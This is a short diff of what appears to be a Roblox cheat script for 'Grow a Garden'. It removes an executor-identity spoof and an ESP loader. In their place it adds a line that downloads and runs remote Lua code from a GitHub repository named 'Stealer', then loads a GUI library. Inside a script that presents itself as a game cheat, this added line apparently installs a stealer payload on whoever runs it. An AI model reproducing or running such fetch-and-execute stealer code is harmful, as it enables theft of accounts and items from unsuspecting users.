@@ -1,15 +1,4 @@
-old_identify = identifyexecutor
-fake_identify = function()
-    real_exec = old_identify()
-    if real_exec == "Delta" then
-        return "Delta_Allowed"
-    end
-    return real_exec
-end
-identifyexecutor = fake_identify
-getgenv().identifyexecutor = fake_identify
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FatalLoots/GrowaGarden/refs/heads/main/EggESPstl", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/Null"))()
 
 local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/BloodLetters/Ash-Libs/refs/heads/main/source.lua"))()
 
